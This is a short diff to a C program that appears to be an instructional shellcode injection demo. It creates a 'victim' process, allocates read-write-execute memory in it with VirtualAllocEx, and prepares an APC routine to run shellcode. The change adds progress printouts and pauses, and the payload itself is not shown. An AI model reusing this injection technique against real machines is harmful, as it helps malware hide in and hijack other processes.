@@ -48,9 +48,13 @@ int main() {
 	HANDLE victimProcess = pi.hProcess;
 	HANDLE threadHandle = pi.hThread;
 
+	printf("%s PID %ld\n", k, pi.dwProcessId);
+
 	printf("%s Now we will allocate memory on our created process\n", k);
 	system("pause");
 	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	printf("%s allocated %zu-bytes with rwx permissions on address: 0x%p\n", k, sizeof(shellcode), shellAddress);
+	system("pause");
 	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
 
 	printf("%s Now we will write our APC containing the shellcode on the memory space that we allocated\n", k);
